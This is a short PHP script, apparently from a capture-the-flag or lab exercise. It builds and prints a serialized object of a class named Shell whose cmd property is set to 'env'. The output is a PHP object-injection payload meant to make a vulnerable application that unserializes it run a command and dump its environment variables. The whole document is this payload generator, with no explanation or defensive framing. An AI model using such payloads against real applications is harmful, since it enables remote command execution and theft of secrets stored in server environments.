<?php
    class Shell {
        public $cmd;
    }

    $a = new Shell;
    $a->cmd = 'env';
    echo serialize($a);